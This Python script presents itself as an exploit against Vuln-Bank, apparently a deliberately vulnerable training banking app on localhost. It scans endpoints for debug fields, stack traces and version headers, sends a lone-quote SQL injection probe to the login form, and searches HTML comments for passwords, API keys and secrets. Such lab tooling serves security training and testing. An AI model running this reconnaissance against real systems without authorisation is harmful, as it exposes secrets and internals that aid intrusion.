#!/usr/bin/env python3
"""
Debug Information Exposure Exploit for Vuln-Bank

This script demonstrates how to extract sensitive debug information from the Vuln-Bank application
through dynamic testing of various endpoints.

Usage:
    python3 exploit.py [target_url]

Example:
    python3 exploit.py http://localhost:5000
"""

import requests
import json
import sys
import argparse
import re
from urllib.parse import urljoin
from colorama import init, Fore, Style

# Initialize colorama for colored output
init()

def test_debug_info_in_responses(base_url):
    """
    Test for debug information in API responses
    
    Args:
        base_url: The base URL of the vulnerable application
        
    Returns:
        dict: Dictionary of endpoints with exposed debug information
    """
    print(f"{Fore.BLUE}[*] Testing for debug information in API responses...{Style.RESET_ALL}")
    
    # Define endpoints to test
    endpoints = [
        "/",
        "/login",
        "/check_balance/12345",
        "/transactions/12345",
        "/api/users/search",
        "/api/transfer",
        "/api/virtual-cards",
        "/api/bill-payments",
        "/api/settings"
    ]
    
    # Define patterns to look for in responses
    debug_patterns = [
        r"debug_info",
        r"stack_trace",
        r"error_details",
        r"query_used",
        r"server_time",
        r"server_version",
        r"database_type",
        r"debug_mode",
        r"execution_time",
        r"memory_usage"
    ]
    
    findings = {}
    
    for endpoint in endpoints:
        url = urljoin(base_url, endpoint)
        print(f"{Fore.BLUE}[*] Testing endpoint: {url}{Style.RESET_ALL}")
        
        # Try both GET and POST requests
        for method in ["GET", "POST"]:
            try:
                if method == "GET":
                    response = requests.get(url, timeout=5)
                else:
                    # For POST requests, try with empty JSON body
                    response = requests.post(url, json={}, timeout=5)
                
                # Check if response is JSON
                try:
                    resp_data = response.json()
                    is_json = True
                except:
                    resp_data = response.text
                    is_json = False
                
                # Look for debug patterns in the response
                debug_info = []
                
                if is_json:
                    # Convert JSON to string for pattern matching
                    resp_str = json.dumps(resp_data)
                    
                    # Check each pattern
                    for pattern in debug_patterns:
                        if re.search(pattern, resp_str, re.IGNORECASE):
                            debug_info.append(pattern)
                            
                    # If we found debug info, extract and display it
                    if debug_info:
                        print(f"{Fore.GREEN}[+] Found debug information in {method} response from {endpoint}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}[+] Debug patterns found: {', '.join(debug_info)}{Style.RESET_ALL}")
                        
                        # Extract and display the debug information
                        if isinstance(resp_data, dict):
                            for key, value in resp_data.items():
                                if any(pattern.lower() in key.lower() for pattern in debug_patterns):
                                    print(f"{Fore.GREEN}[+] {key}: {value}{Style.RESET_ALL}")
                        
                        # Add to findings
                        if endpoint not in findings:
                            findings[endpoint] = {}
                        findings[endpoint][method] = {
                            "debug_patterns": debug_info,
                            "response": resp_data if is_json else "Non-JSON response"
                        }
                else:
                    # For non-JSON responses, check the raw text
                    for pattern in debug_patterns:
                        if re.search(pattern, resp_data, re.IGNORECASE):
                            debug_info.append(pattern)
                    
                    if debug_info:
                        print(f"{Fore.GREEN}[+] Found debug information in {method} response from {endpoint}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}[+] Debug patterns found: {', '.join(debug_info)}{Style.RESET_ALL}")
                        
                        # Add to findings
                        if endpoint not in findings:
                            findings[endpoint] = {}
                        findings[endpoint][method] = {
                            "debug_patterns": debug_info,
                            "response": "Non-JSON response with debug information"
                        }
            
            except requests.exceptions.RequestException as e:
                print(f"{Fore.RED}[-] Error testing {method} {endpoint}: {str(e)}{Style.RESET_ALL}")
    
    return findings

def test_debug_info_in_error_responses(base_url):
    """
    Test for debug information in error responses
    
    Args:
        base_url: The base URL of the vulnerable application
        
    Returns:
        dict: Dictionary of endpoints with exposed debug information in error responses
    """
    print(f"\n{Fore.BLUE}[*] Testing for debug information in error responses...{Style.RESET_ALL}")
    
    # Define endpoints to test with invalid inputs to trigger errors
    error_tests = [
        {"endpoint": "/login", "method": "POST", "data": {"username": "'"}, "description": "SQL injection attempt"},
        {"endpoint": "/check_balance/invalid'", "method": "GET", "data": None, "description": "Invalid account number"},
        {"endpoint": "/transactions/invalid'", "method": "GET", "data": None, "description": "Invalid account number"},
        {"endpoint": "/api/transfer", "method": "POST", "data": {"amount": "invalid"}, "description": "Invalid amount"},
        {"endpoint": "/api/users/1000000", "method": "GET", "data": None, "description": "Non-existent user ID"},
        {"endpoint": "/api/virtual-cards/1000000", "method": "GET", "data": None, "description": "Non-existent card ID"},
        {"endpoint": "/api/settings", "method": "POST", "data": {"invalid_setting": True}, "description": "Invalid setting"}
    ]
    
    # Define patterns to look for in error responses
    error_patterns = [
        r"stack_trace",
        r"traceback",
        r"at\s+[\w\.]+\(.*\.py:\d+\)",
        r"File\s+\".*\.py\",\s+line\s+\d+",
        r"SQLite3Error",
        r"SyntaxError",
        r"TypeError",
        r"ValueError",
        r"Exception",
        r"Error:",
        r"query:",
        r"SQL syntax"
    ]
    
    findings = {}
    
    for test in error_tests:
        url = urljoin(base_url, test["endpoint"])
        method = test["method"]
        data = test["data"]
        description = test["description"]
        
        print(f"{Fore.BLUE}[*] Testing {method} {url} - {description}{Style.RESET_ALL}")
        
        try:
            if method == "GET":
                response = requests.get(url, timeout=5)
            else:
                response = requests.post(url, json=data, timeout=5)
            
            # Check if response is JSON
            try:
                resp_data = response.json()
                is_json = True
            except:
                resp_data = response.text
                is_json = False
            
            # Look for error patterns in the response
            error_info = []
            
            if is_json:
                # Convert JSON to string for pattern matching
                resp_str = json.dumps(resp_data)
                
                # Check each pattern
                for pattern in error_patterns:
                    if re.search(pattern, resp_str, re.IGNORECASE):
                        error_info.append(pattern)
                        
                # If we found error info, extract and display it
                if error_info:
                    print(f"{Fore.GREEN}[+] Found error information in {method} response from {test['endpoint']}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Error patterns found: {', '.join(error_info)}{Style.RESET_ALL}")
                    
                    # Extract and display the error information
                    if isinstance(resp_data, dict):
                        for key, value in resp_data.items():
                            if any(re.search(pattern, key, re.IGNORECASE) for pattern in error_patterns):
                                print(f"{Fore.GREEN}[+] {key}: {value}{Style.RESET_ALL}")
                    
                    # Add to findings
                    if test["endpoint"] not in findings:
                        findings[test["endpoint"]] = {}
                    findings[test["endpoint"]][method] = {
                        "error_patterns": error_info,
                        "description": description,
                        "response": resp_data if is_json else "Non-JSON response"
                    }
            else:
                # For non-JSON responses, check the raw text
                for pattern in error_patterns:
                    if re.search(pattern, resp_data, re.IGNORECASE):
                        error_info.append(pattern)
                
                if error_info:
                    print(f"{Fore.GREEN}[+] Found error information in {method} response from {test['endpoint']}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Error patterns found: {', '.join(error_info)}{Style.RESET_ALL}")
                    
                    # Add to findings
                    if test["endpoint"] not in findings:
                        findings[test["endpoint"]] = {}
                    findings[test["endpoint"]][method] = {
                        "error_patterns": error_info,
                        "description": description,
                        "response": "Non-JSON response with error information"
                    }
        
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Error testing {method} {test['endpoint']}: {str(e)}{Style.RESET_ALL}")
    
    return findings

def test_debug_headers(base_url):
    """
    Test for debug information in HTTP headers
    
    Args:
        base_url: The base URL of the vulnerable application
        
    Returns:
        dict: Dictionary of endpoints with exposed debug information in headers
    """
    print(f"\n{Fore.BLUE}[*] Testing for debug information in HTTP headers...{Style.RESET_ALL}")
    
    # Define endpoints to test
    endpoints = [
        "/",
        "/login",
        "/check_balance/12345",
        "/api/users/search"
    ]
    
    # Define patterns to look for in headers
    header_patterns = [
        r"X-Debug",
        r"X-Runtime",
        r"X-Powered-By",
        r"Server",
        r"X-AspNet-Version",
        r"X-Environment",
        r"X-Database-Version",
        r"X-Request-ID"
    ]
    
    findings = {}
    
    for endpoint in endpoints:
        url = urljoin(base_url, endpoint)
        print(f"{Fore.BLUE}[*] Testing headers for: {url}{Style.RESET_ALL}")
        
        try:
            response = requests.get(url, timeout=5)
            
            # Check headers for debug information
            debug_headers = {}
            
            for header, value in response.headers.items():
                if any(re.search(pattern, header, re.IGNORECASE) for pattern in header_patterns):
                    debug_headers[header] = value
                    print(f"{Fore.GREEN}[+] Found debug header: {header}: {value}{Style.RESET_ALL}")
            
            if debug_headers:
                # Add to findings
                findings[endpoint] = {
                    "debug_headers": debug_headers
                }
        
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Error testing headers for {endpoint}: {str(e)}{Style.RESET_ALL}")
    
    return findings

def test_debug_comments_in_html(base_url):
    """
    Test for debug comments in HTML responses
    
    Args:
        base_url: The base URL of the vulnerable application
        
    Returns:
        dict: Dictionary of endpoints with debug comments in HTML
    """
    print(f"\n{Fore.BLUE}[*] Testing for debug comments in HTML responses...{Style.RESET_ALL}")
    
    # Define endpoints to test
    endpoints = [
        "/",
        "/login",
        "/dashboard",
        "/profile"
    ]
    
    # Define patterns to look for in HTML comments
    comment_patterns = [
        r"<!--.*TODO.*-->",
        r"<!--.*FIXME.*-->",
        r"<!--.*DEBUG.*-->",
        r"<!--.*password.*-->",
        r"<!--.*api key.*-->",
        r"<!--.*secret.*-->",
        r"<!--.*database.*-->",
        r"<!--.*connection.*-->",
        r"<!--.*remove in production.*-->"
    ]
    
    findings = {}
    
    for endpoint in endpoints:
        url = urljoin(base_url, endpoint)
        print(f"{Fore.BLUE}[*] Testing for HTML comments in: {url}{Style.RESET_ALL}")
        
        try:
            response = requests.get(url, timeout=5)
            
            # Check if response is HTML
            if "text/html" in response.headers.get("Content-Type", ""):
                html_content = response.text
                
                # Look for comment patterns
                comments = []
                
                for pattern in comment_patterns:
                    matches = re.findall(pattern, html_content, re.IGNORECASE)
                    comments.extend(matches)
                
                if comments:
                    print(f"{Fore.GREEN}[+] Found debug comments in HTML from {endpoint}{Style.RESET_ALL}")
                    for comment in comments:
                        print(f"{Fore.GREEN}[+] Comment: {comment}{Style.RESET_ALL}")
                    
                    # Add to findings
                    findings[endpoint] = {
                        "debug_comments": comments
                    }
        
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Error testing HTML comments for {endpoint}: {str(e)}{Style.RESET_ALL}")
    
    return findings

def main():
    parser = argparse.ArgumentParser(description="Test for debug information exposure in Vuln-Bank")
    parser.add_argument("url", nargs="?", default="http://localhost:5000", 
                        help="Base URL of the vulnerable application (default: http://localhost:5000)")
    args = parser.parse_args()
    
    print(f"{Fore.YELLOW}=== Vuln-Bank Debug Information Exposure Exploit ==={Style.RESET_ALL}")
    print(f"{Fore.BLUE}[*] Target: {args.url}{Style.RESET_ALL}")
    
    # Run all tests
    debug_info_findings = test_debug_info_in_responses(args.url)
    error_info_findings = test_debug_info_in_error_responses(args.url)
    header_findings = test_debug_headers(args.url)
    html_comment_findings = test_debug_comments_in_html(args.url)
    
    # Summarize findings
    print(f"\n{Fore.YELLOW}=== Summary of Findings ==={Style.RESET_ALL}")
    
    total_findings = 0
    
    if debug_info_findings:
        print(f"{Fore.GREEN}[+] Found debug information in {len(debug_info_findings)} API responses{Style.RESET_ALL}")
        total_findings += len(debug_info_findings)
    
    if error_info_findings:
        print(f"{Fore.GREEN}[+] Found debug information in {len(error_info_findings)} error responses{Style.RESET_ALL}")
        total_findings += len(error_info_findings)
    
    if header_findings:
        print(f"{Fore.GREEN}[+] Found debug information in headers from {len(header_findings)} endpoints{Style.RESET_ALL}")
        total_findings += len(header_findings)
    
    if html_comment_findings:
        print(f"{Fore.GREEN}[+] Found debug comments in HTML from {len(html_comment_findings)} endpoints{Style.RESET_ALL}")
        total_findings += len(html_comment_findings)
    
    if total_findings == 0:
        print(f"{Fore.RED}[-] No debug information exposure vulnerabilities found{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}[+] Total findings: {total_findings} instances of debug information exposure{Style.RESET_ALL}")
    
    print(f"\n{Fore.BLUE}[*] Debug information exposure testing complete.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
